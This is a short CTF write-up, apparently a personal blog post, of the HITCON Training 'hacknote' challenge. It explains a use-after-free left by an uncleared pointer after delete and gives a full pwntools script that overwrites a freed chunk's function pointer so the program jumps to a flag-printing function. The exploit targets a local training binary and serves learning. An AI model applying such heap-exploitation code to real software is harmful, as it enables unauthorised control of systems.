---
layout:		post
title:		HITCON Training writeup
author:		wooy0ung
tags:		pwn
category: 	writeup
---


>[索引目录]  
>0x010 hacknote(uaf)  
<!-- more -->


## 0x010 hacknote(uaf)

delete操作没有清空指针，导致的uaf。程序malloc了8 byte的fastbin存函数指针以及size
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x010-001.png)

show操作call了该指针，把chunk的函数指针劫持到magic打印出flag
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x010-002.png)

exp.py
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

s = process("./hacknote")
elf = ELF("./hacknote")

def add(con):
	s.sendlineafter("Your choice :","1")
	s.sendlineafter("size :",str(len(con)))
	s.sendlineafter("Content :",con)

def show(idx):
	s.sendlineafter("Your choice :","3")
	s.sendlineafter("Index :",str(idx))

def delete(idx):
	s.sendlineafter("Your choice :","2")
	s.sendlineafter("Index :",str(idx))

magic_addr = 0x08048986

add("A"*0x40)
add("A"*0x40)
add("A"*0x40)

delete(0)
delete(1)

add(p32(magic_addr))
show(0)
s.interactive()
```
![](/assets/img/writeup/2018-04-11-hitcon-training-writeup/0x010-003.png)